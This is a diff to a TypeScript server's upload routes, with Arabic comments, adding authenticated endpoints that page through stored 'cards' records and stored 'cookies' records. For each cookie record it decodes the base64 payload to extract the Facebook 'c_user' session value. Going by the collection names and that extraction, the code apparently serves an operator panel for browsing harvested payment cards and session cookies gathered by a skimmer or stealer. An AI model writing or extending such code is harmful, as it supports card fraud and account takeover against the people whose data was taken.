@@ -128,4 +128,43 @@ export async function uploadRoutes(app: any) {
     const res = await db.collection('cookies').deleteOne({ _id: (id as any) });
     return { deleted: res.deletedCount };
   });
+
+  // الحصول على قائمة البطاقات
+  app.get('/api/cards', { preHandler: requireAuth }, async (req: any) => {
+    const { limit = 100, page = 1 } = req.query || {};
+    const db = await getDb();
+    const skip = (Number(page) - 1) * Number(limit);
+    const items = await db.collection('cards')
+      .find({})
+      .project({ payload: 0 })
+      .sort({ createdAt: -1 })
+      .skip(skip)
+      .limit(Number(limit))
+      .toArray();
+    const total = await db.collection('cards').countDocuments();
+    return { items, total, page: Number(page), limit: Number(limit) };
+  });
+
+  // الحصول على قائمة الكوكيز مع c_user
+  app.get('/api/cookies', { preHandler: requireAuth }, async (req: any) => {
+    const { limit = 100, page = 1 } = req.query || {};
+    const db = await getDb();
+    const skip = (Number(page) - 1) * Number(limit);
+    const raw = await db.collection('cookies')
+      .find({})
+      .sort({ createdAt: -1 })
+      .skip(skip)
+      .limit(Number(limit))
+      .toArray();
+    const items = raw.map((doc: any) => {
+      try {
+        const dec: any = JSON.parse(Buffer.from(doc.payload, 'base64').toString('utf8'));
+        return { _id: doc._id, c_user: dec.c_user ?? null, createdAt: doc.createdAt };
+      } catch {
+        return { _id: doc._id, c_user: null, createdAt: doc.createdAt };
+      }
+    });
+    const total = await db.collection('cookies').countDocuments();
+    return { items, total, page: Number(page), limit: Number(limit) };
+  });
 } 
